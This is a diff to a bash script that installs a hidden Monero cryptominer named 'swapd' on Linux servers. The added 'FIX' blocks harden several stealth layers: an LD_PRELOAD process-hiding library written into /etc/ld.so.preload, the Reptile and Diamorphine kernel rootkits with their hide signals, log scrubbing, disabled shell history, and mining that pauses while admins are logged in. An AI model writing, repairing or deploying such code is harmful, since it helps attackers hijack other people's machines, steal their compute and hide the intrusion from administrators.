@@ -15,6 +15,28 @@ export HISTFILE=/dev/null
 
 # Trap errors but continue execution
 trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
+
+# ==================== PACKAGE MANAGER DETECTION ====================
+# Detect which package manager is available
+if command -v apt-get >/dev/null 2>&1; then
+    PKG_MANAGER="apt-get"
+    PKG_INSTALL="apt-get install -y"
+    PKG_UPDATE="apt-get update"
+elif command -v yum >/dev/null 2>&1; then
+    PKG_MANAGER="yum"
+    PKG_INSTALL="yum install -y"
+    PKG_UPDATE="yum update"
+elif command -v dnf >/dev/null 2>&1; then
+    PKG_MANAGER="dnf"
+    PKG_INSTALL="dnf install -y"
+    PKG_UPDATE="dnf update"
+else
+    echo "[!] WARNING: No supported package manager found"
+    PKG_MANAGER="unknown"
+    PKG_INSTALL="echo 'No package manager available:'"
+    PKG_UPDATE="true"
+fi
+echo "[*] Detected package manager: $PKG_MANAGER"
 #unset HISTFILE ;history -d $((HISTCMD-1))
 #export HISTFILE=/dev/null ;history -d $((HISTCMD-1))
 
@@ -555,21 +577,30 @@ echo ''
 echo "[*] Deploying libhide.so (userland process hiding)..."
 
 if command -v gcc &>/dev/null; then
+    # ==================== FIX: Improved libhide.so compilation ====================
     # Create the process hider source
     printf '#define _GNU_SOURCE\n#include <dirent.h>\n#include <dlfcn.h>\n#include <string.h>\nstruct linux_dirent64 {unsigned long long d_ino; long long d_off; unsigned short d_reclen; unsigned char d_type; char d_name[];};\nstatic ssize_t (*og)(int, void *, size_t) = NULL;\nssize_t getdents64(int fd, void *dp, size_t c) {\n if(!og) og = dlsym(RTLD_NEXT, "getdents64");\n ssize_t r = og(fd, dp, c);\n if(r <= 0) return r;\n char *p = (char *)dp; size_t o = 0;\n while(o < r) {\n  struct linux_dirent64 *d = (struct linux_dirent64 *)(p + o);\n  if(strstr(d->d_name, "swapd") || strstr(d->d_name, "launcher.sh") || strstr(d->d_name, "system-watchdog")) {\n   int l = d->d_reclen; memmove(p + o, p + o + l, r - (o + l)); r -= l; continue;\n  }\n  o += d->d_reclen;\n }\n return r;\n}\nssize_t __getdents64(int fd, void *dp, size_t c) { return getdents64(fd, dp, c); }\n' > /tmp/hide.c
     
-    # Compile with error handling
-    if gcc -Wall -fPIC -shared -o /usr/local/lib/libhide.so /tmp/hide.c -ldl 2>/dev/null; then
-        echo "/usr/local/lib/libhide.so" > /etc/ld.so.preload
-        echo "[✓] libhide.so deployed successfully"
-        echo "[✓] Processes 'swapd', 'launcher.sh', 'system-watchdog' will be hidden from ps/ls"
-        
-        # Verify it loaded
-        if [ -f /etc/ld.so.preload ] && [ -f /usr/local/lib/libhide.so ]; then
-            echo "[✓] libhide.so verified and active"
+    # Compile with detailed error logging
+    echo "[*] Compiling libhide.so..."
+    if gcc -Wall -fPIC -shared -o /usr/local/lib/libhide.so /tmp/hide.c -ldl 2>&1 | tee /tmp/libhide_compile.log; then
+        if [ -f /usr/local/lib/libhide.so ]; then
+            echo "/usr/local/lib/libhide.so" > /etc/ld.so.preload
+            echo "[✓] libhide.so deployed successfully"
+            echo "[✓] Processes 'swapd', 'launcher.sh', 'system-watchdog' will be hidden from ps/ls"
+            
+            # Verify it loaded
+            if [ -f /etc/ld.so.preload ] && [ -f /usr/local/lib/libhide.so ]; then
+                echo "[✓] libhide.so verified and active"
+            fi
+        else
+            echo "[!] WARNING: Compilation appeared successful but libhide.so not found"
+            cat /tmp/libhide_compile.log 2>/dev/null
         fi
     else
         echo "[!] WARNING: libhide.so compilation failed"
+        echo "[!] Check compilation log: /tmp/libhide_compile.log"
+        cat /tmp/libhide_compile.log 2>/dev/null
         echo "[*] Will rely on kernel rootkits for hiding instead"
     fi
     
@@ -2343,13 +2374,33 @@ sed -i '/diamorphine/d' /var/log/syslog 2>/dev/null
 sed -i '/diamorphine/d' /var/log/kern.log 2>/dev/null
 sed -i '/diamorphine/d' /var/log/messages 2>/dev/null
 
-kill -63 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')"
+kill -63 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
 
-# Create emergency swap to prevent OOM killer
-sudo dd if=/dev/zero of=/swapfile bs=1G count=2
-sudo chmod 600 /swapfile
-sudo mkswap /swapfile
-sudo swapon /swapfile
+# ==================== FIX: Create swap only if not already active ====================
+if ! swapon --show | grep -q '/swapfile'; then
+    if [ -f /swapfile ]; then
+        echo "[*] Swapfile exists but not active, activating..."
+        sudo chmod 600 /swapfile
+        sudo swapon /swapfile 2>/dev/null || {
+            echo "[!] Failed to activate existing swap, recreating..."
+            sudo swapoff /swapfile 2>/dev/null || true
+            sudo rm -f /swapfile
+            sudo dd if=/dev/zero of=/swapfile bs=1G count=2
+            sudo chmod 600 /swapfile
+            sudo mkswap /swapfile
+            sudo swapon /swapfile
+        }
+    else
+        echo "[*] Creating new swapfile..."
+        sudo dd if=/dev/zero of=/swapfile bs=1G count=2
+        sudo chmod 600 /swapfile
+        sudo mkswap /swapfile
+        sudo swapon /swapfile
+        echo "/swapfile none swap sw 0 0" | sudo tee -a /etc/fstab
+    fi
+else
+    echo "[*] Swapfile already active, skipping creation"
+fi
 echo "vm.swappiness=100" | sudo tee -a /etc/sysctl.conf
 sudo sysctl -p
 
@@ -2387,6 +2438,24 @@ git clone https://gitee.com/fengzihk/Reptile.git --depth 1 || {
 
 cd Reptile
 
+# ==================== FIX: Generate config.h before compilation ====================
+echo "[*] Generating config.h for Reptile..."
+cat > config.h << 'CONFIG_EOF'
+#ifndef _CONFIG_H
+#define _CONFIG_H
+#define MAGIC_VALUE "GonUqb"
+#define MAGIC_VALUE2 "WODZlW"  
+#define MAGIC_VALUE3 "lTpTQh"
+#define PROC_NAME "swapd"
+#define HIDE_PREFIX "hide_"
+#endif
+CONFIG_EOF
+
+# Also create it in sbin/ directory where it's needed
+mkdir -p sbin 2>/dev/null
+cp config.h sbin/config.h 2>/dev/null || true
+echo "[✓] config.h generated successfully"
+
 # Apply critical kernel version patch
 sed -i 's/REPTILE_ALLOW_VERSIONS =.*/REPTILE_ALLOW_VERSIONS = "3.10.0-1160"/' config.mk
 
@@ -2421,7 +2490,29 @@ sed -i '/Reptile/d' /var/log/kern.log 2>/dev/null
 sed -i '/Reptile/d' /var/log/messages 2>/dev/null
 dmesg -C 2>/dev/null
 
-kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
+# ==================== FIX: Safe process hiding with Reptile ====================
+# Only try to hide processes if Reptile is actually loaded
+if lsmod | grep -q reptile 2>/dev/null; then
+    echo "[*] Reptile loaded, applying process hiding..."
+    
+    # Get miner PID(s)
+    MINER_PIDS=$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
+    
+    if [ -n "$MINER_PIDS" ]; then
+        for pid in $MINER_PIDS; do
+            # Validate PID is a number
+            if [[ "$pid" =~ ^[0-9]+$ ]]; then
+                echo "[*] Hiding PID: $pid"
+                kill -31 "$pid" 2>/dev/null || echo "[!] Failed to hide PID $pid"
+            fi
+        done
+    else
+        echo "[!] No miner processes found to hide"
+    fi
+else
+    echo "[!] Reptile not loaded, skipping Reptile-based hiding"
+    echo "[*] Relying on libhide.so for process hiding instead"
+fi
 
 # Replace existing SSH handling with:
 SSHD_PIDS=$(pgrep -f "sshd:.*@")
@@ -2432,8 +2523,14 @@ for pid in $SSHD_PIDS; do
 done
 
 # Whitelist current SSH session
-CURRENT_SSH_PORT=$(sudo netstat -tnep | awk '/sshd/ && $NF~/'"$$"'/ {split($4,a,":");print a[2]}')
-sudo /reptile/reptile_cmd show_port $CURRENT_SSH_PORT
+# ==================== FIX: Use ss if netstat not available ====================
+if command -v netstat >/dev/null 2>&1; then
+    CURRENT_SSH_PORT=$(sudo netstat -tnep | awk '/sshd/ && $NF~/'"$$"'/ {split($4,a,":");print a[2]}')
+else
+    # Fallback to ss command
+    CURRENT_SSH_PORT=$(sudo ss -tnep | awk '/sshd/ && /'"$$"'/ {split($4,a,":");print a[2]}')
+fi
+sudo /reptile/reptile_cmd show_port $CURRENT_SSH_PORT 2>/dev/null || true
 
 # ====== ENABLE ROOTKIT FEATURES SAFELY ======
 # Activate Reptile but exclude critical components
@@ -2470,7 +2567,19 @@ sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
 sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
 sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
 
-kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
+# ==================== FIX: Safe process hiding for crypto rootkit ====================
+if lsmod | grep -q rootkit 2>/dev/null; then
+    MINER_PIDS=$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
+    if [ -n "$MINER_PIDS" ]; then
+        for pid in $MINER_PIDS; do
+            if [[ "$pid" =~ ^[0-9]+$ ]]; then
+                kill -31 "$pid" 2>/dev/null || true
+            fi
+        done
+    fi
+else
+    echo "[!] Crypto rootkit not loaded, skipping"
+fi
 rm -rf hiding-cryptominers-linux-rootkit/
 
 echo ''
@@ -2526,112 +2635,3 @@ if command -v journalctl >/dev/null 2>&1; then
 fi
 
 
-echo ''
-
-kill -31 "$(pgrep -f -u root config.json) 2>/dev/null || true
-kill -31 "$(pgrep -f -u root config_background.json) 2>/dev/null || true
-kill -31 "$(/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-kill -31 "$(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-kill -63 "$(/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-kill -63 "$(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-
-
-# Cleanup xmrig files in login directory
-echo "[*] Cleaning up xmrig files in login directory..."
-rm -rf ~/xmrig*.* 2>/dev/null
-
-echo '========================================================================='
-echo '[✓] FULL ULTIMATE v3.2 SETUP COMPLETE!'
-echo '========================================================================='
-echo ''
-echo 'System Configuration:'
-if [ "$SYSTEMD_AVAILABLE" = true ]; then
-    echo '  Init System: systemd'
-    echo ''
-    echo 'Service Management Commands:'
-    echo '  Start:   systemctl start swapd'
-    echo '  Stop:    systemctl stop swapd'
-    echo '  Status:  systemctl status swapd'
-    echo '  Logs:    journalctl -u swapd -f'
-else
-    echo '  Init System: SysV init (legacy mode)'
-    echo ''
-    echo 'Service Management Commands:'
-    echo '  Start:   /etc/init.d/swapd start'
-    echo '  Stop:    /etc/init.d/swapd stop'
-    echo '  Status:  /etc/init.d/swapd status'
-    echo '  Restart: /etc/init.d/swapd restart'
-fi
-
-echo ''
-echo 'Stealth Features Deployed:'
-if [ -f /usr/local/lib/libhide.so ] && [ -f /etc/ld.so.preload ]; then
-    echo '  ✓ libhide.so: ACTIVE (userland hiding)'
-else
-    echo '  ✗ libhide.so: Not deployed (gcc unavailable)'
-fi
-
-if lsmod | grep -q diamorphine 2>/dev/null; then
-    echo '  ✓ Diamorphine: ACTIVE (kernel rootkit)'
-else
-    echo '  ○ Diamorphine: Not loaded'
-fi
-
-if [ -d /reptile ] || lsmod | grep -q reptile 2>/dev/null; then
-    echo '  ✓ Reptile: ACTIVE (kernel rootkit)'
-else
-    echo '  ○ Reptile: Not loaded'
-fi
-
-if [ -f /usr/local/bin/system-watchdog ]; then
-    echo '  ✓ Intelligent Watchdog: ACTIVE (3-min, state-tracked)'
-else
-    echo '  ○ Watchdog: Not deployed'
-fi
-
-if [ -f /root/.swapd/launcher.sh ]; then
-    echo '  ✓ launcher.sh: ACTIVE (mount --bind /proc hiding)'
-else
-    echo '  ○ launcher.sh: Not created'
-fi
-
-echo '  ✓ Resource Constraints: Nice=19, CPUQuota=95%, Idle scheduling'
-echo '  ✓ Miner renamed: 'swapd' (stealth binary name)'
-
-echo ''
-echo 'Installation Method:'
-if [ "$USE_WGET" = true ]; then
-    echo '  Download Tool: wget (curl SSL/TLS failed)'
-else
-    echo '  Download Tool: curl'
-fi
-
-# Check how the file was obtained
-if [ -f /tmp/.local_file_used ]; then
-    echo '  Download Mode: Local file (from script directory)'
-    rm -f /tmp/.local_file_used
-elif [ -f /tmp/.manual_upload_used ]; then
-    echo '  Download Mode: Manual upload (SSL too old for HTTPS)'
-    rm -f /tmp/.manual_upload_used
-else
-    echo '  Download Mode: Automatic download'
-fi
-
-echo ''
-echo 'Mining Configuration:'
-echo '  Binary:  /root/.swapd/swapd'
-echo '  Config:  /root/.swapd/config.json'
-echo '  Wallet:  $WALLET'  # Keep double quotes for variable expansion
-echo '  Pool:    gulf.moneroocean.stream:80'
-
-echo ''
-echo 'Process Hiding Commands:'
-echo '  Hide:    kill -31 $PID  (requires Diamorphine)'
-echo '  Unhide:  kill -63 $PID  (requires Diamorphine)'
-echo '  Reptile: /reptile/reptile_cmd hide'
-
-echo ''
-echo '========================================================================='
-echo '[*] Miner will auto-stop when admins login and restart when they logout'
-echo '[*] All processes are hidden via multiple stealth layers'
-echo '========================================================================='
